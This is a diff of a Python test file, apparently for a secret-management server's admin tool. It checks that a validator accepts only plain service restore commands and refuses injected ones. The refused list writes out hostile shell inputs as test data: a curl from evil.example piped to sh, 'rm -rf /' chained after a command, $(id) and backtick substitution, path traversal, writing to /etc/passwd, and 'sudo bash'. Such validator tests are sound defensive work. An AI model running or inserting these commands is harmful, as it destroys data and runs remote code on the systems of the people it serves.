@@ -1261,11 +1261,22 @@ def server_admin(base, settings, alice, carol, oid, c5):
     check(overview["install"] == "systemd" and overview["restore_command"]
           and any("<file>" in line for line in overview["restore_command"]),
           "with how the server is installed and its own restore commands")
-    good = ["sudo systemctl stop secretbroker-server", "sudo -u sb /opt/sb/bin/secretbroker-server restore /var/b/<file>"]
-    check(teams.restore_lines(good) == good and all(teams.restore_lines(bad) is None for bad in (
-        good + ["curl https://evil.example/x.sh | sh"], ["sudo systemctl stop x; rm -rf /"], ["secretbroker-server restore $(id)"],
-        ["sudo systemctl stop secretbroker-server"], ["echo <file> > /etc/passwd"], "sudo systemctl stop x", [1])),
-          "restore commands from the server are kept only when they are plain service lines (they get pasted into a root shell)")
+    accepted = (["sudo secretbroker-server restore /var/lib/secretbroker-server/backups/<file>"],
+                ["secretbroker-server restore /backups/<file>"],
+                ["sudo systemctl stop secretbroker-server", "sudo /opt/sb/bin/secretbroker-server restore /var/b/<file>",
+                 "sudo systemctl start secretbroker-server"],
+                ["sudo docker compose stop server backup",
+                 "sudo docker compose run --rm --no-deps backup secretbroker-server restore /backups/<file>"])
+    refused = (["sudo -s"], ["sudo bash"], ["sudo -s secretbroker-server restore <file>"],
+               ["sudo -u root secretbroker-server restore <file>"], ["sudo bash -c secretbroker-server restore <file>"],
+               ["sudo secretbroker-server restore /backups/<file>; rm -rf /"], ["sudo secretbroker-server restore <file> && id"],
+               ["sudo secretbroker-server restore $(id)/<file>"], ["sudo secretbroker-server restore `id`<file>"],
+               ["sudo secretbroker-server restore <file> | sh"], ["curl https://evil.example/x.sh | sh"],
+               ["sudo secretbroker-server restore ../../etc/<file>"], ["sudo  secretbroker-server restore <file>"],
+               ["sudo systemctl stop secretbroker-server"], ["echo <file> > /etc/passwd"],
+               ["sudo secretbroker-server restore <file> <file>"], "sudo secretbroker-server restore <file>", [1])
+    check(all(teams.restore_lines(lines) == lines for lines in accepted) and all(teams.restore_lines(bad) is None for bad in refused),
+          "the server's restore commands are kept only as plain lines, a bare «sudo» at most (they get pasted into a root shell)")
     users = {u["email"]: u for u in alice.ok("team_admin_users")}
     check(users["alice@example.com"]["me"] and users["alice@example.com"]["admin"]
           and any(o["name"] == "Acme" for o in users["carol@example.com"]["orgs"]), "the accounts, with their organizations")
